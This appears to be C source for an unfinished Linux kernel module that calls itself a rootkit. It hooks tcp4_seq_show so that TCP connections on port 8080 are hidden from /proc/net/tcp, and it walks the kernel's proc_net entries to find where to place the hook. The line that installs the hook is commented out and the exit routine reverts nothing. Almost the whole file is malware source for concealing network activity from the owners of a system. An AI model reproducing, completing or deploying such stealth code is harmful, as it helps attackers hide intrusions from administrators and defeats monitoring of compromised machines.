#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/net.h>
#include <net/sock.h>
#include <net/tcp.h>
#include <linux/proc_fs.h>
#include <linux/net_namespace.h>
#include <linux/seq_file.h>

#include <linux/proc_ns.h>
#include <linux/refcount.h>
#include <linux/spinlock.h>
#include <linux/atomic.h>
#include <linux/binfmts.h>
#include <linux/sched/coredump.h>
#include <linux/sched/task.h>

MODULE_LICENSE("GPL");

#define HIDE_PORT 0x1f90
#define DEBUG


struct proc_dir_entry {
    unsigned int low_ino;
    umode_t mode;
    nlink_t nlink;
    kuid_t uid;
    kgid_t gid;
    loff_t size;
    const struct inode_operations *proc_iops;
    /*
     * NULL ->proc_fops means "PDE is going away RSN" or
     * "PDE is just created". In either case, e.g. ->read_proc won't be
     * called because it's too late or too early, respectively.
     *
     * If you're allocating ->proc_fops dynamically, save a pointer
     * somewhere.
     */
    const struct file_operations *proc_fops;
    struct proc_dir_entry *next, *parent, *subdir;
    void *data;
    void *read_proc;
    void *write_proc;
    atomic_t count;     /* use count */
    int pde_users;  /* number of callers into module in progress */
    struct completion *pde_unload_completion;
    struct list_head pde_openers;   /* who did ->open, but not ->release */
    spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
    u8 namelen;
    char name[];
};

asmlinkage static int (*original_tcp4_seq_show)(struct seq_file *seq, void *v);

asmlinkage static int hooked_tcp4_seq_show(struct seq_file *seq, void *v){
    struct sock *sk = v;

    //if its the first print or struct has our port in it
    if ((v != SEQ_START_TOKEN) && (sk->__sk_common.skc_num == HIDE_PORT || sk->__sk_common.skc_dport == HIDE_PORT))
    {
        printk(KERN_INFO "[+] rootkit hide port in tcp4_seq_show\n");
        return 0;
    }

    return original_tcp4_seq_show(seq, v);
}

static int __init init_rootkit(void) {
    printk(KERN_INFO "[+] rootkit init_rootkit\n");

    original_tcp4_seq_show = (void *) kallsyms_lookup_name("tcp4_seq_show");
    if (0 == original_tcp4_seq_show)
    {
        printk(KERN_INFO "[!] rootkit Error Finding tcp4_seq_show\n");
        return 1;
    }
    printk(KERN_INFO "[+] rootkit tcp4_seq_show = %p\n", original_tcp4_seq_show);

    //struct net *net;
    //net = get_proc_net(inode);

    struct tcp_seq_afinfo * my_afinfo = NULL;
    struct proc_dir_entry * my_proc_net = init_net.proc_net->subdir;
    
    // find the tcp entry in proc_net
    do {
        if (strncmp(my_proc_net->name, "tcp", 3) == 0)
        {
            break;
        }
        my_proc_net = my_proc_net->next;
    }
    while (my_proc_net != NULL);

    //TODO: what happend if there is no tcp file?????
    printk(KERN_INFO "[+] rootkit found the correct my_proc_net entry %s\n", my_proc_net->name);
    
    /*my_afinfo = (struct tcp_seq_afinfo*)my_proc_net->data;
    // set the hook to our function.
    my_afinfo->seq_ops.show = hooked_tcp4_seq_show;
    printk(KERN_INFO "[+] rootkit hooked the tcp_seq_show\n");
*/
    //remove_proc_entry("tcp", my_proc_net);
    //proc_create_net_data("tcp", 0444, my_proc_net, &hooked_tcp4_seq_ops, sizeof(struct tcp_iter_state), &tcp4_seq_afinfo);

    return 0;
}

static void __exit exit_rootkit(void) {
    printk(KERN_INFO "[+] rootkit exit_rootkit\n");    
    //TODO: revert to original

    return;
}

module_init(init_rootkit);
module_exit(exit_rootkit);